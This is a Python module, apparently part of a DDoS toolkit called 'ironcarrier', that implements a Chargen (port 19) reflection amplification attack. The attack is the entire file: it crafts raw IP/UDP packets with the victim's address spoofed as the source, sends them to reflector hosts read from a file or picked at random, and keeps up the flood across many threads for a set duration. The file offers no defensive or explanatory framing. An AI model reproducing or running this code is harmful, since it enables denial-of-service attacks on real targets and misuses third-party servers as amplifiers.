#!/usr/bin/env python3
"""
Chargen Amplification Vector
Exploits Character Generator Protocol (port 19) for ~358x amplification
"""

import socket
import struct
import random
import time
import threading
from typing import Optional, List
from ironcarrier.core.stats import StatsCollector


class Attack:
    """Chargen amplification attack vector"""
    
    CHARGEN_TRIGGER = b'\x00\x00\x00\x00'
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 50, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.reflectors: List[str] = []
        self.reflector_file = kwargs.get('reflector_file', None)
        self.chargen_port = kwargs.get('chargen_port', 19)
        self._load_reflectors()
    
    def _load_reflectors(self) -> None:
        if self.reflector_file:
            try:
                with open(self.reflector_file, 'r') as f:
                    self.reflectors = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except FileNotFoundError:
                pass
        
        if not self.reflectors:
            for _ in range(10000):
                ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                self.reflectors.append(ip)
    
    def _build_packet(self) -> bytes:
        reflector = random.choice(self.reflectors)
        
        udp_len = 8 + len(self.CHARGEN_TRIGGER)
        udp_header = struct.pack('!HHHH', self.port, self.chargen_port, udp_len, 0)
        
        total_len = 20 + udp_len
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, total_len, random.randint(0, 65535), 0x4000, 64, 17, 0,
            socket.inet_aton(self.target), socket.inet_aton(reflector)
        )
        
        return ip_header + udp_header + self.CHARGEN_TRIGGER
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                packet = self._build_packet()
                sock.sendto(packet, (random.choice(self.reflectors), self.chargen_port))
                self.stats.add_packets(1, len(packet))
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
